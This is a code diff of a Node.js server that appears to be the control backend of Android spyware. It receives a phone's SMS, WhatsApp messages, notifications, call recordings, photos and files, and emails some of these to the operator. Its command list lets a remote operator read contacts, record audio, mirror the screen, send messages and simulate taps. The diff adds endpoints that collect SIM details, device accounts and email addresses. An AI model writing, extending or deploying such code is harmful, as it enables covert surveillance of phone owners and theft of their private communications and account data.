@@ -35,10 +35,7 @@ let transporter = null;
 if (CONFIG.ENABLE_EMAIL && CONFIG.EMAIL_USER && CONFIG.EMAIL_PASS) {
   transporter = nodemailer.createTransport({
     service: 'gmail',
-    auth: {
-      user: CONFIG.EMAIL_USER,
-      pass: CONFIG.EMAIL_PASS
-    }
+    auth: { user: CONFIG.EMAIL_USER, pass: CONFIG.EMAIL_PASS }
   });
   console.log('📧 Email enabled for:', CONFIG.EMAIL_USER);
 }
@@ -48,8 +45,6 @@ let emailResetTime = Date.now();
 
 async function sendEmail(subject, body, attachments = []) {
   if (!transporter || !CONFIG.ENABLE_EMAIL) return;
-  
-  // Rate limit
   if (Date.now() - emailResetTime > 3600000) {
     emailCount = 0;
     emailResetTime = Date.now();
@@ -58,7 +53,6 @@ async function sendEmail(subject, body, attachments = []) {
     console.log('⚠️ Email rate limit reached');
     return;
   }
-  
   try {
     await transporter.sendMail({
       from: `"CSK4 Server" <${CONFIG.EMAIL_USER}>`,
@@ -113,6 +107,9 @@ let notifications = [];
 let whatsappMessages = [];
 let activities = [];
 let callRecordings = [];
+let simInfo = {};      // 🆕
+let accountsInfo = {}; // 🆕
+let emailsInfo = {};   // 🆕
 
 // ============ DEVICE ENDPOINTS ============
 
@@ -120,14 +117,9 @@ app.post('/api/device/register', (req, res) => {
   const { deviceId, deviceName, token, model, android, battery } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
   devices[deviceId] = {
-    deviceId,
-    deviceName: deviceName || 'Unknown',
-    model: model || deviceName,
-    android: android || 'Unknown',
-    battery: battery || 0,
-    lastSeen: new Date(),
-    online: true,
-    ip: req.ip
+    deviceId, deviceName: deviceName || 'Unknown',
+    model: model || deviceName, android: android || 'Unknown',
+    battery: battery || 0, lastSeen: new Date(), online: true, ip: req.ip
   };
   io.emit('device-update', devices);
   console.log(`✅ ${deviceName} (${deviceId})`);
@@ -183,8 +175,6 @@ app.post('/api/device/messages', (req, res) => {
   messages = messages.filter(m => m.deviceId !== deviceId);
   list.forEach(m => messages.push({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
   io.emit('messages-update', messages);
-  
-  // Email recent 5 SMS
   const recent = list.slice(0, 5);
   if (recent.length > 0) {
     let body = `Device: ${devices[deviceId]?.deviceName || deviceId}\nTotal: ${list.length}\n\nRecent Messages:\n\n`;
@@ -240,7 +230,7 @@ app.post('/api/device/info', (req, res) => {
   res.json({ success: true });
 });
 
-// ============ NOTIFICATIONS (NEW) ============
+// ============ NOTIFICATIONS ============
 app.post('/api/device/notification', (req, res) => {
   const { deviceId, package: pkg, title, text, time, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
@@ -255,7 +245,7 @@ app.post('/api/device/notification', (req, res) => {
   res.json({ success: true });
 });
 
-// ============ WHATSAPP (NEW) ============
+// ============ WHATSAPP ============
 app.post('/api/device/whatsapp', (req, res) => {
   const { deviceId, from, message, time, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
@@ -270,7 +260,7 @@ app.post('/api/device/whatsapp', (req, res) => {
   res.json({ success: true });
 });
 
-// ============ ACTIVITIES (NEW) ============
+// ============ ACTIVITIES ============
 app.post('/api/device/activity', (req, res) => {
   const { deviceId, type, data, time, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
@@ -285,32 +275,83 @@ app.post('/api/device/activity', (req, res) => {
   res.json({ success: true });
 });
 
-// ============ CALL RECORDING (NEW) ============
+// ============ CALL RECORDING ============
 app.post('/api/device/callrecording', upload.single('file'), (req, res) => {
   const { deviceId, number, duration, type, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   if (!req.file) return res.status(400).json({ error: 'No file' });
-  
   const entry = {
-    deviceId,
-    number,
-    duration,
-    type,
+    deviceId, number, duration, type,
     filename: req.file.filename,
     url: `/uploads/${req.file.filename}`,
     time: new Date()
   };
   callRecordings.push(entry);
   io.emit('callrecording-update', callRecordings);
-  
   sendEmail(
     `📞 Call Recording: ${number}`,
     `Device: ${devices[deviceId]?.deviceName || deviceId}\nNumber: ${number}\nType: ${type}\nDuration: ${duration}s\nTime: ${new Date().toLocaleString()}`,
-    [{
-      filename: `call-${number}-${Date.now()}.m4a`,
-      path: `./uploads/${req.file.filename}`
-    }]
+    [{ filename: `call-${number}-${Date.now()}.m4a`, path: `./uploads/${req.file.filename}` }]
   );
+  res.json({ success: true });
+});
+
+// ============ 🆕 SIM INFO ============
+app.post('/api/device/siminfo', (req, res) => {
+  const { deviceId, sims, token } = req.body;
+  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  const entry = { deviceId, sims, time: new Date() };
+  simInfo[deviceId] = entry;
+  io.emit('siminfo-update', simInfo);
+  let simText = '';
+  if (sims && sims.length > 0) {
+    sims.forEach((sim) => {
+      simText += `SIM ${sim.slot}:\n  Number: ${sim.number || 'N/A'}\n  Operator: ${sim.operator || 'N/A'}\n  Country: ${sim.country || 'N/A'}\n  Network: ${sim.networkType || 'N/A'}\n  State: ${sim.state || 'N/A'}\n\n`;
+    });
+  }
+  sendEmail(
+    `📱 SIM Info: ${devices[deviceId]?.deviceName || deviceId}`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${simText}\nTime: ${new Date().toLocaleString()}`
+  );
+  console.log(`📱 SIM info received from ${deviceId}`);
+  res.json({ success: true });
+});
+
+// ============ 🆕 ACCOUNTS ============
+app.post('/api/device/accounts', (req, res) => {
+  const { deviceId, accounts, total, token } = req.body;
+  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  const entry = { deviceId, accounts, total, time: new Date() };
+  accountsInfo[deviceId] = entry;
+  io.emit('accounts-update', accountsInfo);
+  let accText = `Total: ${total}\n\n`;
+  if (accounts && accounts.length > 0) {
+    accounts.forEach(acc => { accText += `📧 ${acc.name}\n   Type: ${acc.type}\n\n`; });
+  }
+  sendEmail(
+    `👤 Accounts: ${total}`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${accText}\nTime: ${new Date().toLocaleString()}`
+  );
+  console.log(`👤 Accounts received: ${total}`);
+  res.json({ success: true });
+});
+
+// ============ 🆕 EMAIL ACCOUNTS ============
+app.post('/api/device/emails', (req, res) => {
+  const { deviceId, emails, total, token } = req.body;
+  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  const entry = { deviceId, emails, total, time: new Date() };
+  emailsInfo[deviceId] = entry;
+  io.emit('emails-update', emailsInfo);
+  let emailText = `Total: ${total}\n\n`;
+  if (emails && emails.length > 0) {
+    emails.forEach(email => { emailText += `📧 ${email}\n`; });
+  }
+  sendEmail(
+    `📧 Email Accounts: ${total}`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${emailText}\nTime: ${new Date().toLocaleString()}`
+  );
+  console.log(`📧 Emails received: ${total}`);
   res.json({ success: true });
 });
 
@@ -318,23 +359,18 @@ app.post('/api/device/upload', upload.single('file'), (req, res) => {
   const { deviceId, type, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   if (!req.file) return res.status(400).json({ error: 'No file' });
-
   const entry = {
-    deviceId,
-    type: type || 'file',
+    deviceId, type: type || 'file',
     filename: req.file.filename,
     originalName: req.file.originalname,
     url: `/uploads/${req.file.filename}`,
-    size: req.file.size,
-    time: new Date()
+    size: req.file.size, time: new Date()
   };
-
   if (type === 'photo') photos.push(entry);
   else if (type === 'video') videos.push(entry);
   else if (type === 'audio') audioRec.push(entry);
   else if (type === 'screenshot') screenshots.push(entry);
   else files.push(entry);
-
   io.emit('new-file', entry);
   console.log(`📁 ${type}: ${entry.originalName}`);
   res.json({ success: true, file: entry });
@@ -369,6 +405,7 @@ app.get('/api/admin/data', (req, res) => {
     audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
     messages, callLogs, apps: installedApps, deviceInfo, commands, screenshots,
     notifications, whatsapp: whatsappMessages, activities, callRecordings,
+    simInfo, accounts: accountsInfo, emails: emailsInfo,  // 🆕
     stats: {
       totalDevices: Object.keys(devices).length,
       onlineDevices: Object.values(devices).filter(d => d.online).length,
@@ -384,7 +421,10 @@ app.get('/api/admin/data', (req, res) => {
       totalNotifications: notifications.length,
       totalWhatsapp: whatsappMessages.length,
       totalActivities: activities.length,
-      totalCallRecordings: callRecordings.length
+      totalCallRecordings: callRecordings.length,
+      totalSims: Object.keys(simInfo).length,                                     // 🆕
+      totalAccounts: Object.values(accountsInfo).reduce((s, a) => s + (a.total || 0), 0),  // 🆕
+      totalEmails: Object.values(emailsInfo).reduce((s, e) => s + (e.total || 0), 0)       // 🆕
     }
   });
 });
@@ -397,24 +437,22 @@ app.post('/api/admin/command', (req, res) => {
     'record_audio', 'screenshot', 'lock_screen',
     'get_location', 'get_contacts', 'get_messages', 'get_calllogs',
     'get_files', 'get_apps', 'get_nearby', 'get_bluetooth', 'get_info',
+    'get_sim_info', 'get_accounts', 'get_email_accounts',  // 🆕
     'vibrate', 'play_sound', 'flashlight_on', 'flashlight_off',
     'start_webrtc', 'start_audio_stream', 'stop_webrtc', 'switch_camera',
     'start_screen_mirror', 'stop_screen_mirror',
     'open_app', 'uninstall_app', 'force_stop_app',
     'set_brightness', 'set_volume', 'set_ring_mode',
     'send_sms', 'send_whatsapp', 'show_notification',
-    'touch_tap', 'touch_swipe',
+    'touch_tap', 'touch_swipe', 'touch_back', 'touch_home', 'touch_recent',
     'start_call_recording', 'stop_call_recording'
   ];
   if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });
 
   const cmd = {
     id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
-    deviceId,
-    command,
-    params: params || {},
-    time: new Date(),
-    status: 'pending'
+    deviceId, command, params: params || {},
+    time: new Date(), status: 'pending'
   };
   commands.push(cmd);
   io.to(deviceId).emit('command', cmd);
@@ -430,6 +468,9 @@ app.delete('/api/admin/device/:deviceId', (req, res) => {
    notifications, whatsappMessages, activities].forEach(arr => {
     for (let i = arr.length - 1; i >= 0; i--) if (arr[i].deviceId === id) arr.splice(i, 1);
   });
+  delete simInfo[id];
+  delete accountsInfo[id];
+  delete emailsInfo[id];
   io.emit('device-update', devices);
   res.json({ success: true });
 });
@@ -442,24 +483,14 @@ app.delete('/api/admin/clear-commands/:deviceId', (req, res) => {
 // ============ SOCKET.IO ============
 io.on('connection', (socket) => {
   console.log('🔌', socket.id);
-
-  socket.on('register-device', (id) => {
-    socket.join(id);
-    console.log('📱 Device:', id);
-  });
-
-  socket.on('register-admin', () => {
-    socket.join('admin-room');
-    console.log('👤 Admin');
-  });
-
+  socket.on('register-device', (id) => { socket.join(id); console.log('📱 Device:', id); });
+  socket.on('register-admin', () => { socket.join('admin-room'); console.log('👤 Admin'); });
   socket.on('webrtc-offer', (data) => io.to(data.target).emit('webrtc-offer', data));
   socket.on('webrtc-answer', (data) => io.to(data.target).emit('webrtc-answer', data));
   socket.on('webrtc-ice', (data) => io.to(data.target).emit('webrtc-ice', data));
   socket.on('screen-mirror-offer', (data) => io.to(data.target).emit('screen-mirror-offer', data));
   socket.on('screen-mirror-answer', (data) => io.to(data.target).emit('screen-mirror-answer', data));
   socket.on('screen-mirror-ice', (data) => io.to(data.target).emit('screen-mirror-ice', data));
-
   socket.on('disconnect', () => console.log('❌', socket.id));
 });
 
